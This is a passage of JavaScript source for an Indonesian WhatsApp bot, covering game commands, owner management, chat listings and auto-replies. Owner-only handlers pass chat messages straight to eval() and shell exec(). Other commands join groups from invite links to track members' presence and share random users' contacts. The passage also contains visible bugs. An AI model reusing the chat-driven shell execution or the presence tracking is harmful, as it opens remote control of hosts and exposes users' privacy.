if (!args[1]) return setReply(`Contoh : ${prefix + command} gold 2\n 1 Gold = 50000 Money`)
db.data.users[m.sender].emas -= anu
let monaynya = 50000 * anu
db.data.users[m.sender].monay += monaynya
setTimeout( () => {
setReply(`Transaksi Berhasil ✔️\n*Sisa uangmu* : ${db.data.users[m.sender].monay}\n*Sisa Emas Mu:* ${db.data.users[m.sender].emas}`)
}, 2000) 
} else if (args[0] === "emerald"){
if (db.data.users[m.sender].emerald < anu) return setReply(`Kamu Tidak Memiliki Cukup Emerald Untuk Melanjutkan Transaksi Ini`)
if (!args[1]) return setReply(`Contoh : ${prefix + command} emerald 2\n 1 Emerald = 100000 Money`)
db.data.users[m.sender].emerald -= anu
let monaynya = 100000 * anu
db.data.users[m.sender].monay += monaynya
setTimeout( () => {
setReply(`Transaksi Berhasil ✔️\n*Sisa uangmu* : ${db.data.users[m.sender].monay}\n*Sisa Emerald Mu:* ${db.data.users[m.sender].emerald}`)
}, 2000) 
} else { setReply("Incorrect Format!") }
}
break
case "heal":{
if (!db.data.users[m.sender].darah < 1) return setReply("Kamu Hanya Bisa Menggunakannya Saat Darahmu 0")
if (db.data.users[m.sender].darah > 100) return setReply("Darahmu Masih Full")
if (db.data.users[m.sender].potion < 1) return setReply(`Kamu Tidak Punya Potion, Belilah dengan cara #buypotion _jumlah_`) 
db.data.users[m.sender].darah += 100
db.data.users[m.sender].potion -= 1
setReply("Success! Darahmu Full Kembali")
}
break 
case "hunt": case "hunting": case"berburu":{
if (db.data.users[m.sender].darah < 1) return setReply("Your Blood Is Gone, Try To Heal Using Potions") 
let luka = ["Tertusuk Duri Saat Berburu","Terpleset Ke Jurang Saat Berburu","Tertangkap Hewan Buas","Tidak Berhati-hati","Terjerat Akar","Terjatuh Saat berburu"]
let location = ["Hutan","Hutan Amazon","Hutan Tropis","Padang Rumput","Hutan Afrika","Pegunungan"]
var ikanmu = Math.ceil(Math.random() * 10)
var ayam = Math.ceil(Math.random() * 8)
var kelinci = Math.ceil(Math.random() * 7)
var dombanya = [3,0,4,0,5,4,6,0,1,0,2,3,0,3,0,1]
var sapinya = [2,0,3,0,4,0,5,0,1,0,2,0,3,0,1]
var gajahnya = [1,0,4,0,2,0,1,0,2,1,3,0,1]
var domba = dombanya[Math.floor(Math.random() * dombanya.length)] 
var sapi = sapinya[Math.floor(Math.random() * sapinya.length)] 
var gajah = gajahnya[Math.floor(Math.random() * gajahnya.length)] 
var lukanya = luka[Math.floor(Math.random() * luka.length)]
var lokasinya = location[Math.floor(Math.random() * location.length)]
 if (lokasinya === "Hutan") {
 var image = "./media/gambarnye/rpg/rimba.jpg"
} else
 if (lokasinya === "Hutan Amazon") {
 var image ="./media/gambarnye/rpg/amazon.jpg"
} else
 if (lokasinya === "Hutan Tropis") {
 var image = "./media/gambarnye/rpg/tropis.jpg"
} else
 if (lokasinya === "Padang Rumput") {
 var image = "./media/gambarnye/rpg/padang_rumput.jpg"
} else
 if (lokasinya === "Hutan Afrika") {
 var image = "./media/gambarnye/rpg/afrika.jpg"
} else
 if (lokasinya === "Pegunungan") {
var image = "./media/gambarnye/rpg/pegunungan.jpg"
}
 setTimeout( () => {
let teksehmazeh = `_[ Hasil Berburu ]_\n`
teksehmazeh += `*🐟 Ikan* : ${ikanmu}\n`
teksehmazeh += `*🐔 Ayam* : ${ayam}\n`
teksehmazeh += `*🐇 Kelinci* : ${kelinci}\n`
teksehmazeh += `*🐑 Domba* : ${domba}\n`
teksehmazeh += `*🐄 Sapi* : ${sapi}\n`
teksehmazeh += `*🐘 Gajah* : ${gajah}\n\n`
teksehmazeh += `_[ INFO ]_\n`
teksehmazeh += `*Lokasi* : ${lokasinya}\n`
teksehmazeh += `*Luka* : ${lukanya}, Darah - 10\n`
teksehmazeh += `*Sisa Darah* : ${db.data.users[m.sender].darah}\n`
 let buttons = [
 {
buttonId: `${prefix + command}`, 
buttonText: {
displayText: "Berburu Lagi ️🏹"
 }, type: 1},
 ]
 let buttonMessage = {
 image: { url: image },
 caption: teksehmazeh,
 footer: copyright,
 buttons: buttons,
 headerType: 4
}
zyren.sendMessage(from, buttonMessage, { quoted: m }) 
}, 5000)
 setTimeout( () => {
setReply(`${pushname} Mulai Berburu Di ${lokasinya}`)
}, 1000) 
db.data.users[m.sender].ikan += ikanmu
db.data.users[m.sender].ayam += ayam
db.data.users[m.sender].kelinci += kelinci
db.data.users[m.sender].domba += domba
db.data.users[m.sender].sapi += sapi
db.data.users[m.sender].gajah += gajahi
db.data.users[m.sender].darah -= 10
}
break
//=================================================//
case "addstick":{
if (!isCreator) return onlyOwner()
if (!isQuotedSticker) return setReply("Reply sticker!")
if (!text) return setReply("Namanya?")
if (db.data.stickernye[text]) return setReply("Nama tersebut sudah di gunakan")
const fileName = fs.readdirSync("./media/sampahnye").length + 1
const media = await zyren.downloadAndSaveMediaMessage(quoted, `./media/sampahnye/${fileName}`)
const anu = await UploadFileUgu(media)
db.data.stickernye[text] = {
url: anu.url, 
size: anu.size,
}
setReply(`Success addstick ${text}`)
}
break
//=================================================//
case "addvn":{
if (!isCreator) return onlyOwner()
if (!isQuotedAudio) return setReply("Reply audio!")
if (!text) return setReply("Namanya?")
if (db.data.audionye[text]) return setReply("Nama tersebut sudah di gunakan")
const fileName = fs.readdirSync("./media/sampahnye").length + 1
const media = await zyren.downloadAndSaveMediaMessage(quoted, `./media/sampahnye/${fileName}`)
const anu = await UploadFileUgu(media)
db.data.audionye[text] = {
url: anu.url, 
size: anu.size,
}
setReply(`Success addvn ${text}`)
}
break
//=================================================//
case "addowner":{
if (!isDevoloper) return onlyOwner()
if (mentionByReply) {
require("../basetzy/owner/indexByReply")(zyren, m, prefix, command, mentionByReply) 
} else if (mentionByTag[0] && m.isGroup) {
require("../basetzy/owner/indexByTag")(zyren, m, prefix, command, mentionByTag) 
} else if (text.split("|")[0] && !text.split("|")[1] && !text.split("|")[2]) {
require("../basetzy/owner/indexByNumber")(zyren, m, prefix, command, text) 
} else if (text.split("|")[0] && text.split("|")[1] && !text.split("|")[2]) {
if (text.split("|")[0] && text.split("|")[1] == "permanent") {
db.data.owner[text.split("|")[0]] = {
date: calender, 
expired: "INFINITY"
}
setReply(`Success added owner @${text.split("|")[0].split("@")[0]}`)
} else {
require("../basetzy/owner/index")(zyren, m, prefix, command, text)
}
} else if (text.split("|")[0] && text.split("|")[1] && text.split("|")[2]) {
let time = text.split("|")[2] + text.split("|")[1] == "1months"? "30days" : text.split("|")[2] + text.split("|")[1] == "2months"? "60days" : text.split("|")[2] + text.split("|")[1] == "3months"? "90days" : text.split("|")[2] + text.split("|")[1] == "4months"? "120days" : text.split("|")[2] + text.split("|")[1] == "5months"? "150days" : text.split("|")[2] + text.split("|")[1] == "6months"? "180days" : text.split("|")[2] + text.split("|")[1] == "7months"? "210days" : text.split("|")[2] + text.split("|")[1] == "8months"? "240days" : text.split("|")[2] + text.split("|")[1] == "9months"? "270days" : text.split("|")[2] + text.split("|")[1] == "10months"? "300days" : text.split("|")[2] + text.split("|")[1] == "11months"? "330days" : text.split("|")[2] + text.split("|")[1] == "12months"? "360days" : text.split("|")[2] + text.split("|")[1]
db.data.owner[text.split("|")[0]] = {
date: calender, 
expired: Date.now() + toMs(time)
}
setReply(`Success added owner @${text.split("|")[0].split("@")[0]} ${text.split("|")[2]} ${text.split("|")[1]}`)
} else setReply("Reply pesan/Tag orang/Nomer")
}
break
//=================================================//
case "delstick":{
if (!isCreator) return onlyOwner()
if (!text) return setReply("Namanya?")
if (!db.data.stickernye[text]) return setReply("Nama tersebut tidak ada di liststick")
delete db.data.stickernye[text]
setReply(`Success delete stick ${text}`)
}
break
//=================================================//
case "delvn":{
if (!isCreator) return onlyOwner()
if (!text) return setReply("Namanya?")
if (!db.data.audionye[text]) return setReply("Nama tersebut tidak ada di listvn")
delete db.data.audionye[text]
setReply(`Success delete vn ${text}`)
}
break
//=================================================//
case "delowner":{
if (!isDevoloper) return onlyOwner()
if (!Input) return setReply("Reply pesan/Tag orang/Nomer")
if (Input == ownerNumber + "@s.whatsapp.net") return setReply("Tidak bisa menghapus nomer owner utama") 
if (!db.data.owner[Input]) return setReply("User tersebut bukan owner")
delete db.data.owner[Input]
setReply(`Success delete owner @${Input.split("@")[0]}`)
}
break
//=================================================//
case "liststick":{
let teks = "┌──⭓「 *LIST STICKER* 」\n│\n"
let data = Object.keys(db.data.stickernye)
for (let x of data) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Total ada : ${data.length}*`
setReply(teks)
}
break
//=================================================//
case "listvn":{
let teks = "┌──⭓「 *LIST VN* 」\n│\n"
let data = Object.keys(db.data.audionye)
for (let x of data) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Total ada : ${data.length}*`
setReply(teks)
}
break
//=================================================//
case "listonline":
try{
let teks = "┌──⭓「 *LIST ONLINE* 」\n│\n"
if (m.isGroup) {
if (text.includes("https://chat.whatsapp.com/")) {
var nana = await zyren.groupAcceptInvite(text.split("https://chat.whatsapp.com/")[1])
} else {
var nana = m.chat
}
let data = [...Object.keys(store.presences[nana]), botNumber]
for (let x of data) {
teks += `│⭔ @${x.split("@")[0]}\n`
}
teks += `│\n└────────────⭓\n\n*Total ada : ${data.length}*`
setReply(teks)
} else if (!m.isGroup) {
if (!text.includes("https://chat.whatsapp.com/")) return setReply(`Example : ${prefix + command} https://chat.whatsapp.com/LNuqIxU5J6w27LNwKuc80i`) 
let nana = await zyren.groupAcceptInvite(text.split("https://chat.whatsapp.com/")[1])
let data = [...Object.keys(store.presences[nana]), botNumber]
for (let x of data) {
teks += `│⭔ @${x.split("@")[0]}\n`
}
teks += `│\n└────────────⭓\n\n*Total ada : ${data.length}*`
setReply(teks)
}
} catch {
setReply("Maaf kak future ini sedang error") 
}
break
//=================================================//
case "listowner":{
let teks = "「 *LIST OWNER* 」\n\n"
let data = Object.keys(db.data.owner)
for (let x of data) {
let cekvip = db.data.owner[x].expired == "INFINITY"? "PERMANENT" : `${ms(db.data.owner[x].expired - Date.now()).days} days ${ms(db.data.owner[x].expired - Date.now()).hours} hours ${ms(db.data.owner[x].expired - Date.now()).minutes} minutes ${ms(db.data.owner[x].expired - Date.now()).seconds} seconds`
teks += `*Number* : @${x.split("@")[0]}\nDate : ${db.data.owner[x].date}\n*Expired* : ${cekvip}\n\n`
}
teks += `\n*Total ada : ${data.length}*`
setReply(teks)
}
break
//=================================================//
case "listban":{
let data = Object.keys(db.data.banned)
let teks = "「 *LIST BANNED* 」\n"
for (let x of data) {
try{
var name = db.data.users[x].name
} catch {
var name = await zyren.getName(x)
}
teks += `*NAME* : ${name}\n*NUMBER* : @${x.split("@")[0]}\n*REASON* : ${db.data.banned[x].reason}\n*DATE* : ${db.data.banned[x].date}\n\n`
}
teks += `\n*Total ada : ${data.length}*`
setReply(teks)
}
break
//=================================================//
case "listblock":{
let teks = "┌──⭓「 *LIST BLOCK* 」\n│\n"
for (let x of listblock) {
teks += `│⭔ @${x.split("@")[0]}\n`
}
teks += `│\n└────────────⭓\n\n*Total ada : ${listblock.length}*`
setReply(teks)
}
break
//=================================================//
case "clearallstick":
if (!isCreator) return onlyOwner()
db.data.stickernye = {}
setReply(mess.success)
break
//=================================================//
case "clearallvn":
if (!isCreator) return onlyOwner()
db.data.audionye = {}
setReply(mess.success)
break
//=================================================//
case "clearallowner":
if (!isDevoloper) return onlyOwner()
db.data.owner = {}
setReply(mess.success)
break
//=================================================//
case "clearallban":
if (!isCreator) return onlyOwner()
db.data.banned = {}
setReply(mess.success)
break
//=================================================//
case "clearalldb":
if (!isCreator) return onlyOwner()
db.data = {}
setReply(mess.success)
break
//=================================================//
case "jadibot":{
if (m.isGroup) return setReply(mess.private)
jadibot(zyren, m.chat)
}
break
//=================================================//
case "stopjadibot":{
if (m.isGroup) return setReply(mess.private)
stopjadibot(zyren, m.chat) 
}
break
//=================================================//
case "deljadibot":{
if (!isCreator) return onlyOwner()
if (!Input) return setReply("Reply pesan/Tag orang/Nomer")
let dataSesi = fs.readdirSync("./jadibot-sesion")
let data = dataSesi.splice("@Xzra", dataSesi.length - 1)
if (!data.includes(Input.split("@")[0])) return setReply(mess.cmd.deljadibot.query)
stopjadibot(zyren, Input) 
setReply(`Success delete @${Input.split("@")[0]} to listjadibot`)
}
break
//=================================================//
case "clearalljadibot":{
if (!isCreator) return onlyOwner()
let dataSesi = fs.readdirSync("./jadibot-sesion")
let data = dataSesi.splice("@Xzra", dataSesi.length - 1)
if (data.length > 0) {
for (let x of data) {
rimraf.sync("./jadibot-sesion/" + x)
}
setReply(mess.success)
} else setReply(mess.success)
}
break
//=================================================//
case "listjadibot":{
if (m.isGroup && !isSewa) return onlySewa()
let dataSesi = fs.readdirSync("./jadibot-sesion")
let data = dataSesi.splice("@Xzra", dataSesi.length - 1)
let teks = "┌──⭓「 *LIST JADI BOT* 」\n│\n"
for (let x of data) {
teks += `│⭔ @${x}\n`
}
teks += `│\n└────────────⭓\n\n*Total ada : ${data.length}*`
setReply(teks)
}
break
//=================================================//
case "menu":{
a = await zyren.sendMessage(m.chat, {react: { text: "🕖", key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
let teksMenu = menunya(m)
let button = [
{ buttonId: `${prefix}owner`, buttonText: { displayText: `𝙾𝚆𝙽𝙴𝚁` }, type: "RESPONSE" },
]
let templateButton = [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `${ownerNumber}` } },
{ urlButton: { displayText: `Youtube`, url: `https://youtube.com/c/PakTzy` } },
{ quickReplyButton: { displayText: `𝙾𝚆𝙽𝙴𝚁`, id: `${prefix}owner` } },
]
let options2 = {
externalAdReply: {
showAdAttribution: true,
title: `hallo kak👋 ${m.pushName}`,
body: "DONT CLICK HERE",
mediaType: 1,
renderLargerThumbnail: false,
thumbnail: logonya,
sourceUrl: "https://youtube.com/c/PakTzy",
}
}
if (db.data.settings[botNumber].setmenu == "location") {
zyren.sendButLoc(m.chat, teksMenu, copyright, await reSize("./media/gambarnye/thezyren.jpg", 300, 300), button, { quoted: tzy })
} else if (db.data.settings[botNumber].setmenu == "image") {
zyren.sendButImage(m.chat, teksMenu, copyright, logonya, button, options2, { quoted: tzy })
} else if (db.data.settings[botNumber].setmenu == "gif") {
zyren.sendButGif(m.chat, teksMenu, copyright, thumbnailvid, logonya, button, { quoted: tzy })
} else if (db.data.settings[botNumber].setmenu == "video") {
zyren.sendButVideo(m.chat, teksMenu, copyright, thumbnailvid, logonya, button, { quoted: tzy })
} else if (db.data.settings[botNumber].setmenu == "location2") {
zyren.send5ButLoc(m.chat, teksMenu, copyright, await reSize("./media/gambarnye/thezyren.jpg", 300, 300), templateButton, { quoted: tzy })
} else if (db.data.settings[botNumber].setmenu == "image2") {
zyren.send5ButImg(m.chat, teksMenu, copyright, logonya, templateButton, { quoted: tzy })
} else if (db.data.settings[botNumber].setmenu == "gif2") {
zyren.send5ButGif(m.chat, teksMenu, copyright, thumbnailvid, logonya, templateButton, { quoted: tzy })
} else if (db.data.settings[botNumber].setmenu == "video2") {
zyren.send5ButVideo(m.chat, teksMenu, copyright, thumbnailvid, logonya, templateButton, { quoted: tzy })
}
}
break
//=================================================//
case "owner": case "creator":
zyren.sendKontak(m.chat, [ownerNumber + "@s.whatsapp.net", ...Object.keys(db.data.owner)], m) 
break
//=================================================//
case "kalkulator":{
if (text.split("+")[0] && text.split("+")[1]) {
const nilai_one = Number(text.split("+")[0])
const nilai_two = Number(text.split("+")[1])
setReply(`${nilai_one + nilai_two}`)
} else if (text.split("-")[0] && text.split("-")[1]) {
const nilai_one = Number(text.split("-")[0])
const nilai_two = Number(text.split("-")[1])
setReply(`${nilai_one - nilai_two}`)
} else if (text.split("×")[0] && text.split("×")[1]) {
const nilai_one = Number(text.split("×")[0])
const nilai_two = Number(text.split("×")[1])
setReply(`${nilai_one * nilai_two}`)
} else if (text.split("÷")[0] && text.split("÷")[1]) {
const nilai_one = Number(text.split("÷")[0])
const nilai_two = Number(text.split("÷")[1])
setReply(`${nilai_one / nilai_two}`)
} else setReply(`*Example* : ${prefix + command} 1 + 1`)
}
break
//=================================================//
case "getpic": case "getpp":{
if (Input) {
try{
var ppWong = await zyren.profilePictureUrl(Input, "image")
} catch {
var ppWong = "https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60"
}
zyren.sendMessage(m.chat, { image : { url : ppWong }, caption: `Nyoh` }, { quoted : m })
} else {
try{
var ppWong = await zyren.profilePictureUrl(m.sender, "image")
} catch {
var ppWong = "https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60"
}
zyren.sendMessage(m.chat, { image : { url : ppWong }, caption: `Nyoh` }, { quoted : m })
}
}
break
//=================================================//
case "getname": {
if (Input) {
try{
var name = db.data.users[Input].name
} catch {
var name = await zyren.getName(Input) 
}
setReply(name)
} else {
setReply(m.pushName)
}
}
break
//=================================================//
case "wame":
if (Input) {
setReply(`wa.me/${Input.split("@")[0]}`) 
} else {
setReply(`wa.me/${m.sender.split("@")[0]}`)
}
break
//=================================================//
case "del":
if (!mentionByReply) return setReply("Reply Pesan")
if (mentionByReply == botNumber) {
zyren.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: mentionByReply } })
} else if (mentionByReply !== botNumber && isBotGroupAdmins) {
zyren.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: mentionByReply } })
}
break
//=================================================//
case "delsampah":{
let files = fs.readdirSync("./media/sampahnye")
let data = files.splice("@Xzra", files.length - 1)
if (data.length == 0) return setReply(`${data.length} junk files detected`)
setReply(`${data.length} junk files detected`)
setTimeout(() => {
setReply("Removing junk files...")
for (let x of data) {
fs.unlinkSync("./media/sampahnye/" + x)
}
}, 2000)
setTimeout(() => {
setReply("Success deleted all junk files")
}, 5000)
}
break
//=================================================//
case "react":
if (!text) return setReply(`Example : ${prefix + command} 😃`)
zyren.sendMessage(m.chat, { react: { text: args[0], key: { remoteJid: m.chat, fromMe: true, id: m.quoted? m.quoted.id : m.id }}})
break
//=================================================//
case "runtime":
setReply(`${runtime(process.uptime())}`)
break
//=================================================//
case "speed":{
let timestamp = speed()
let latensi = speed() - timestamp
setReply(`Speed: ${latensi.toFixed(4)} Second`)
}
break
//=================================================//
case "ping": case "botstatus": case "statusbot": {
const used = process.memoryUsage()
const cpus = os.cpus().map(cpu => {
cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
return cpu
})
const cpu = cpus.reduce((last, cpu, _, { length }) => {
last.total += cpu.total
last.speed += cpu.speed / length
last.times.user += cpu.times.user
last.times.nice += cpu.times.nice
last.times.sys += cpu.times.sys
last.times.idle += cpu.times.idle
last.times.irq += cpu.times.irq
return last
}, {
speed: 0,
total: 0,
times: {
user: 0,
nice: 0,
sys: 0,
idle: 0,
irq: 0
}
})
let timestamp = speed()
let latensi = speed() - timestamp
neww = performance.now()
oldd = performance.now()
respon = `
Kecepatan Respon ${latensi.toFixed(4)} _Second_ \n ${oldd - neww} _miliseconds_\n\nRuntime : ${runtime(process.uptime())}
💻 Info Server
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}
_NodeJS Memory Usaage_
${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length))," ")}: ${formatp(used[key])}`).join("\n")}
${cpus[0] ? `_Total CPU Usage_
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + "*").padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join("\n")}
_CPU Core(s) Usage (${cpus.length} Core CPU)_
${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + "*").padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join("\n")}`).join("\n\n")}` : ""}
`.trim()
setReply(respon)
}
break
//=================================================//
case "listpc":{
let anu = await store.chats.all().filter((v) => v.id.endsWith(".net")).map((v) => v.id)
let teks = `⬣ *LIST PERSONAL CHAT*\n\nTotal Chat : ${anu.length} Chat\n\n`
for (let x of anu) {
try{
var nama = db.data.users[x].name
} catch {
let nama = await zyren.getName(x) 
}
teks += `◉ Nama : ${nama}\n◉ User : @${x.split("@")[0]}\n◉ Chat : https://wa.me/${x.split("@")[0]}\n\n────────────────────────\n\n`
}
setReply(teks)
}
break
//=================================================//
case "listgc":{
let getGroups = await zyren.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
let teks = `⬣ *LIST GROUP CHAT*\n\nTotal Group : ${anu.length} Group\n\n`
for (let x of anu) {
let metadata2 = await zyren.groupMetadata(x)
teks += `◉ Nama : ${metadata2.subject}\n◉ Owner : ${metadata2.owner !== undefined ? "@" + metadata2.owner.split("@")[0] : "Tidak diketahui"}\n◉ ID : ${metadata2.id}\n◉ Dibuat : ${moment(metadata2.creation * 1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")}\n◉ Member : ${metadata2.participants.length}\n\n────────────────────────\n\n`
}
setReply(teks) 
}
break
//=================================================//
case "cariteman":{
let data = Object.keys(db.data.users)
let dapat = zyren.pickRandom(data)
let name = db.data.users[dapat].name
let number = dapat.split("@")[0]
setTimeout(() => {
setReply("Looking for friends.......")
}, 1000)
setTimeout(() => {
setReply("Success to get one friend")
}, 5000)
setTimeout(() => {
zyren.sendContact(m.chat, number, name)
}, 9000)
}
break
//=================================================//
default:
//=========================[ DETECT MESSAGE (P) ]=========================\\
if (salam.includes(messagesC)) {
if (isCreator) return
if (db.data.settings[botNumber].autovn) {
zyren.sendVn(m.chat, ucapbot, m)
} else if (db.data.settings[botNumber].autosticker) {
zyren.sendSticker(m.chat, ucapsalam, m)
} else {
setReply("Ucap salam napah")
}
}
//=========================[ DETECT MESSAGE (asalamualaikum) ]=========================\\
if (budy.includes(`ualaikum`) || budy.includes(`u"alaikum`)) {
if (db.data.settings[botNumber].autovn) {
zyren.sendVn(m.chat, walaikumsalam, m)
} else if (db.data.settings[botNumber].autosticker) {
zyren.sendSticker(m.chat, kumsalam, m)
} else {
setReply("Walaikumsalam kak")
}
}
//=========================[ DETECT MESSAGE (toxic) ]=========================\\
if (bad.includes(messagesC)) {
if (isCreator) return
if (db.data.settings[botNumber].autovn) {
zyren.sendVn(m.chat, astaga, m)
} else if (db.data.settings[botNumber].autosticker) {
await zyren.sendSticker(m.chat, katakasar, m)
} else {
await setReply("Jangan Toxic Kak")
}
}
//=========================[ DETECT MESSAGE SANGE ]=========================\\
if (dosa.includes(messagesC)) {
if (isCreator) return
if (db.data.settings[botNumber].autovn) {
zyren.sendVn(m.chat, sangeya, m)
} else if (db.data.settings[botNumber].autosticker) {
await zyren.sendSticker(m.chat, istigfar, m)
} else {
await setReply("Astagfirloh oni chan")
}
}
//=========================[ DETECT MESSAGE ]=========================\\
if (katahai.includes(messagesC)) {
if (db.data.settings[botNumber].autovn) return zyren.sendVn(m.chat, moshimos, m)
}
//=========================[ DETECT MESSAGE TIME ]=========================\\
if (ohayo.includes(messagesC)) {
if (time2 >= "11:00" && time2 <= "23:50") {
if (db.data.settings[botNumber].autovn) {
zyren.sendVn(m.chat, oahyo, m)
} else {
setReply(`${ucapanWaktu} kak 🙂`)
}
}
}
//=========================[ DETECT MESSAGE TIME ]=========================\\
if (katamalem.includes(messagesC)) {
if (time2 >= "06:00" && time2 <= "17:00") {
if (db.data.settings[botNumber].autovn) {
zyren.sendVn(m.chat, oyasumi, m)
} else {
setReply(`${ucapanWaktu} kak 🙂`)
}
}
}
//=========================[ DETECT MESSAGE TIME ]=========================\\
if (katasiang.includes(messagesC)) {
if (db.data.settings[botNumber].autovn) {
zyren.sendVn(m.chat, koniciwa, m)
} else {
setReply(`${ucapanWaktu} kak 🙂`)
}
}
//=========================[ DETECT MESSAGE (botz) ]=========================\\
if (badud.includes(messagesC)) {
if (db.data.settings[botNumber].autovn) {
zyren.sendVn(m.chat, ucapbot, m)
} else {
setReply(zyren.pickRandom(oawalah))
}
}
//=========================[ DETECT MESSAGE (lopyu) ]=========================\\
if (katalopyou.includes(messagesC)) {
if (db.data.settings[botNumber].autovn) {
zyren.sendVn(m.chat, lopyoutoo, m)
} else {
setReply("??")
}
}
//=========================[ DETECT MESSAGE (ownerNumber) ]=========================\\
if (budy.includes(nomerOwner)) {
if (isCreator) return
const kta = ["*Bentar ya kak nanti juga di bales sama ownerku* 😉", "*Tunggu aja kak, entar juga di bales* 😁", "*Iya kak, ada apa tag owner aku nih* 🙂"]
const su = kta[Math.floor(Math.random() * kta.length)]
setReply(su)
}
//=========================[ DETECT MESSAGE (thanks) ]=========================\\
for (let kasih of thanks) {
if (budy.includes(kasih)) {
if (db.data.settings[botNumber].autosticker) return zyren.sendSticker(m.chat, samasama, m)
setReply(`Sama sama kak ${pushname}`)
}
}
//=========================[ DETECT MESSAGE (eval) ]=========================\\
if (budy.startsWith("=>")) {
if (!isCreator) return
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)}
return setReply(bang)}
try {
setReply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
setReply(String(e))}}
if (budy.startsWith(">")) {
if (!isCreator) return onlyOwner()
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== "string") evaled = require("util").inspect(evaled)
await setReply(evaled)
} catch (err) {
await setReply(String(err))}}
if (budy.startsWith("$")) {
if (!isCreator) return 
exec(budy.slice(2), (err, stdout) => {
if(err) return setReply(err)
if (stdout) return setReply(stdout)})}
//=================================================//
if (m.chat.endsWith("@s.whatsapp.net") && isCmd) {
this.anonymous = this.anonymous ? this.anonymous : {}
let room = Object.values(this.anonymous).find(room => [room.a, room.b].includes(m.sender) && room.state === "CHATTING")
if (room) {
if (/^.*(next|leave|start)/.test(m.text)) return
if ([".next", ".leave", ".stop", ".start", "Cari Partner", "Keluar", "Lanjut", "Stop"].includes(m.text)) return
let other = [room.a, room.b].find(user => user !== m.sender)
m.copyNForward(other, true, m.quoted && m.quoted.fromMe ? {
contextInfo: {
...m.msg.contextInfo,
forwardingScore: 0,
isForwarded: true,
participant: other}} : {})}
return !0}
//=================================================//
if (isCmd && budy.toLowerCase() != undefined) {
if (m.chat.endsWith("broadcast")) return
if (m.isBaileys) return
let msgs = global.db.data.database
if (!(budy.toLowerCase() in msgs)) return
zyren.copyNForward(m.chat, msgs[budy.toLowerCase()], true)}}
} catch (err) {
m.reply(util.format(err))}
}
//=================================================//
let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})